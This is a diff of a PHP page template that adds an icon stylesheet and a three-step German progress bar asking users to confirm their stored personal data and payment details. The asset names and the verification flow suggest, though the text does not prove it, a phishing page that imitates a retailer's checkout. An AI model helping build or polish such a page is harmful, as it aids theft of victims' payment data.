@@ -16,6 +16,8 @@
 		<title><?php echo $title ?></title>
 		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
 		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
+		<link rel="stylesheet" href="src/font-awesome/css/font-awesome.min.css">
+		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">		
 		<link href="src/img/favicon.ico" rel="shortcut icon" />
 	</head>
 	
@@ -130,6 +132,24 @@
 				</h1>
 			</div>
 			
+			<div class="f1-steps">
+				<div class="f1-progress">
+					<div class="f1-progress-line" data-now-value="16.66" data-number-of-steps="3" style="width: 83.34%;"></div>
+				</div>
+				<div class="f1-step activated">
+					<div class="f1-step-icon"><i class="fa fa-user"></i></div>
+					<p>Bestätigung der hinterlegten persönlichen Daten</p>
+				</div>
+				<div class="f1-step activated">
+					<div class="f1-step-icon"><i class="fa fa-dollar"></i></div>
+					<p>Bestätigung der hinterlegten Zahlungsmittel</p>
+				</div>
+				<div class="f1-step active">
+					<div class="f1-step-icon"><i class="fa fa-check"></i></div>
+					<p>Zahlungsinformationen bestätigen</p>
+				</div>
+			</div>	
+
 			<div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
 				<div id="orderUnrelatedArea" class="newOrderSummary" style="width:510px;margin:0 auto;background-color:#FFFFDD;border: 1px solid #A31919">
 					<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
